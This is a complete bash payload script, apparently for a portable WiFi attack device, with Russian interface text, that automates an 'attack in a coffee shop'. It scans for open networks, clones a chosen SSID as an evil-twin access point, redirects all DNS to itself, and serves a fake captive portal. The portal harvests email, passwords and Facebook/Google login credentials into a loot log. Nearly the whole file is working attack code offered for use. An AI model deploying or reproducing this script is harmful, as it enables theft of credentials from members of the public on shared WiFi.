#!/bin/bash
. /root/payloads/library/nullsec-ui.sh
# Title: Атака в кофейне
# Author: bad-antics
# Description: Автоматизированная атака для публичных WiFi сред
# Category: nullsec/social

# Autodetect the right wireless interface (exports $IFACE).
# Falls back to showing the pager error dialog if nothing is plugged in.
. /root/payloads/library/nullsec-iface.sh 2>/dev/null || . "$(dirname "$0")/../../../lib/nullsec-iface.sh"
nullsec_require_iface || exit 1

LOOT_DIR="/mmc/nullsec/public"
mkdir -p "$LOOT_DIR"

PROMPT "АТАКА В КОФЕЙНЕ

Автоматизированная атака для
публичных WiFi локаций.

1. Сканирует открытые сети
2. Создает злой двойник
3. Захватывает учетные данные
4. Собирает данные

Нажмите OK для настройки."

SPINNER_START "Поиск открытых сетей..."
timeout 12 airodump-ng $IFACE --encrypt opn --write-interval 1 -w /tmp/openscan --output-format csv 2>/dev/null
SPINNER_STOP

# Find open networks
grep "OPN" /tmp/openscan*.csv 2>/dev/null | grep -v "^BSSID" > /tmp/open_networks.txt
OPEN_COUNT=$(wc -l < /tmp/open_networks.txt 2>/dev/null || echo 0)

if [ "$OPEN_COUNT" -eq 0 ]; then
    PROMPT "НЕТ ОТКРЫТЫХ СЕТЕЙ

Не найдено открытых WiFi.
Попробовать с WPA сетями?

Нажмите OK для продолжения."
    
    FALLBACK=$(CONFIRMATION_DIALOG "Целевые WPA сети?")
    if [ "$FALLBACK" != "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
        exit 0
    fi
    
    grep "WPA" /tmp/openscan*.csv 2>/dev/null | head -10 > /tmp/open_networks.txt
    OPEN_COUNT=$(wc -l < /tmp/open_networks.txt)
fi

PROMPT "НАЙДЕНО $OPEN_COUNT СЕТЕЙ

Выберите цель для клонирования."

TARGET_NUM=$(NUMBER_PICKER "Цель # (1-$OPEN_COUNT):" 1)

TARGET_LINE=$(sed -n "${TARGET_NUM}p" /tmp/open_networks.txt)
REAL_BSSID=$(echo "$TARGET_LINE" | cut -d',' -f1 | tr -d ' ')
REAL_CHANNEL=$(echo "$TARGET_LINE" | cut -d',' -f4 | tr -d ' ')
TARGET_SSID=$(echo "$TARGET_LINE" | cut -d',' -f14 | tr -d ' ')

DURATION=$(NUMBER_PICKER "Длительность (минуты):" 30)
DURATION_SEC=$((DURATION * 60))

CRED_LOG="$LOOT_DIR/cafe_$(date +%Y%m%d_%H%M).txt"

resp=$(CONFIRMATION_DIALOG "ЗАПУСТИТЬ АТАКУ?

Клон: $TARGET_SSID
Длительность: ${DURATION} мин

Нажмите OK для начала.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

killall hostapd dnsmasq php aireplay-ng 2>/dev/null

# Create portal
PORTAL_DIR="/tmp/cafe_portal"
mkdir -p "$PORTAL_DIR"

cat > "$PORTAL_DIR/index.html" << CAFEHTML
<!DOCTYPE html>
<html>
<head>
<title>$TARGET_SSID - Бесплатный WiFi</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body{font-family:Arial;background:#f9f9f9;margin:0;padding:20px;}
.container{max-width:400px;margin:0 auto;background:white;padding:30px;border-radius:12px;box-shadow:0 4px 15px rgba(0,0,0,0.1);}
.logo{text-align:center;font-size:40px;margin-bottom:20px;}
h1{text-align:center;color:#333;font-size:22px;}
.terms{background:#f5f5f5;padding:15px;border-radius:8px;font-size:12px;margin:20px 0;max-height:100px;overflow-y:auto;}
input{width:100%;padding:14px;margin:10px 0;border:1px solid #ddd;border-radius:8px;box-sizing:border-box;font-size:16px;}
button{width:100%;padding:14px;background:#4caf50;color:white;border:none;border-radius:8px;font-size:16px;cursor:pointer;}
.social{text-align:center;margin-top:20px;}
.social button{background:#1877f2;margin:5px;width:auto;padding:10px 20px;}
.social .google{background:#db4437;}
</style>
</head>
<body>
<div class="container">
<div class="logo">☕</div>
<h1>Добро пожаловать в $TARGET_SSID</h1>
<p style="text-align:center;color:#666;">Подключитесь с помощью email или социальной учетной записи</p>
<form method="POST" action="/capture.php">
<input type="email" name="email" placeholder="Адрес электронной почты" required>
<input type="password" name="password" placeholder="Создать пароль (необязательно)">
<input type="hidden" name="ssid" value="$TARGET_SSID">
<button type="submit">Подключиться к WiFi</button>
</form>
<div class="social">
<p>Или подключитесь через:</p>
<button onclick="document.getElementById('social').style.display='block'">Facebook</button>
<button class="google" onclick="document.getElementById('social').style.display='block'">Google</button>
</div>
<div id="social" style="display:none;margin-top:20px;">
<form method="POST" action="/capture.php">
<input type="email" name="social_email" placeholder="Email социальной учетной записи" required>
<input type="password" name="social_password" placeholder="Пароль" required>
<input type="hidden" name="type" value="social">
<button type="submit">Войти</button>
</form>
</div>
<div class="terms">
Подключаясь, вы соглашаетесь с нашими условиями обслуживания. Это бесплатная публичная сеть. Использование логируется.
</div>
</div>
</body>
</html>
CAFEHTML

cat > "$PORTAL_DIR/capture.php" << CAPPHP
<?php
\$log = "$CRED_LOG";
\$ts = date("Y-m-d H:i:s");
\$ip = \$_SERVER['REMOTE_ADDR'];
\$data = "";
foreach (\$_POST as \$k => \$v) { \$data .= "\$k=\$v "; }
file_put_contents(\$log, "[\$ts] IP:\$ip \$data\n", FILE_APPEND);
header("Location: /success.html");
?>
CAPPHP

cat > "$PORTAL_DIR/success.html" << 'SUCCESSHTML'
<!DOCTYPE html>
<html><head><title>Подключено!</title>
<style>body{font-family:Arial;text-align:center;padding:50px;background:#f9f9f9;}
h1{color:#4caf50;}.icon{font-size:60px;}</style>
</head><body>
<div class="icon">✓</div>
<h1>Вы подключены!</h1>
<p>Наслаждайтесь бесплатным WiFi</p>
<script>setTimeout(function(){window.location='http://www.msftconnecttest.com/redirect';},2000);</script>
</body></html>
SUCCESSHTML

LOG "Запуск атаки в кофейне..."

# Start AP
cat > /tmp/cafe_hostapd.conf << EOF
interface=$IFACE
ssid=$TARGET_SSID
channel=$REAL_CHANNEL
hw_mode=g
auth_algs=1
wpa=0
EOF

hostapd /tmp/cafe_hostapd.conf &
sleep 2
ifconfig $IFACE 10.0.0.1 netmask 255.255.255.0 up

# DNS
cat > /tmp/cafe_dns.conf << EOF
interface=$IFACE
dhcp-range=10.0.0.10,10.0.0.200,5m
address=/#/10.0.0.1
EOF
dnsmasq -C /tmp/cafe_dns.conf &

# Web server
cd "$PORTAL_DIR" && php -S 10.0.0.1:80 &

LOG "Атака активна: $TARGET_SSID"

sleep $DURATION_SEC

killall hostapd dnsmasq php 2>/dev/null

CRED_COUNT=$(wc -l < "$CRED_LOG" 2>/dev/null || echo 0)

PROMPT "АТАКА В КОФЕЙНЕ ЗАВЕРШЕНА

SSID: $TARGET_SSID
Длительность: ${DURATION} мин
Учетные данные: $CRED_COUNT

Лог: $CRED_LOG

Нажмите OK для выхода."
